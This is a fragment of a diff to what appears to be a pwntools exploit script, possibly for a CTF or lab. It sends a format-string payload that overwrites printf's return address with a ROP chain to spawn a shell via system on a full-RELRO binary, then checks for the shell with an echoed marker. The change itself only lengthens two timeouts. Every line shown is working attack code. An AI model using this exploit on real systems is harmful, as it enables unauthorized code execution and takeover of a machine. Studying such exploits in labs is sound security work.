@@ -172,9 +172,9 @@ writes = {printf_ret + i * 8: v for i, v in enumerate(chain)}
 try:
     payload = fmtstr_payload(offset, writes, write_size="short")
     io.sendline(payload)                                 # printf returns into the chain -> shell
-    time.sleep(0.3)
+    time.sleep(0.8)
     io.sendline(b"echo " + MARK)
-    out = io.recvrepeat(2)
+    out = io.recvrepeat(5)
     if MARK in out:
         print("VERIFIED offset=%d system=%#x printf_ret=%#x (ret2system, full RELRO)"
               % (offset, system, printf_ret))
